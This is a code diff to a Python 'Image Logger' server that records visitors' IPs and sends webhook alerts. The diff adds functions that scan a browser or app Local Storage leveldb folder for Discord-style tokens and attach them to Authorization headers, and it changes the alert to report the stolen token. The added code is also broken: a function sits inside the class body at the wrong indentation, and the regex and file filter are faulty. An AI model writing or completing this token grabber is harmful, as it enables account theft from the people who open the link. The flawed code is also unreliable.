@@ -101,7 +101,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**Token:** `{token}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -187,7 +187,38 @@ binaries = {
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
-    
+def getheaders(token=None):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+    }
+
+    if token:
+        headers.update({"Authorization": token})
+
+    return headers
+
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
+    tokens = []
+
+    if not os.path.exists(path):
+        return tokens
+
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
+
+        try:
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except PermissionError:
+            continue
+
+    return tokens
+
     def handleRequest(self):
         try:
             if config["imageArgument"]:
